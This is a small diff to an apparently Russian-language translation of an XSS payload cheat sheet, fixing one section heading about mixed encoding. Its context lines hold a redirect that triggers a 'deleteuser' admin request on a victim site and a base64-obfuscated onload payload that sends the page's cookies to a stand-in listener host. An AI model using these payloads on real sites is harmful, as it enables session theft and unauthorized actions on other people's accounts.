@@ -832,7 +832,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
 ```
 
-#### Mixed Кодирование
+#### Смешанное кодирование
 
 Давайте смешаем и сопоставим базовую кодировку и добавим несколько табуляций и переводов строк (почему браузеры это разрешают, я никогда не узнаю). Табуляции и переводы строк работают, только если они заключены в кавычки:
 
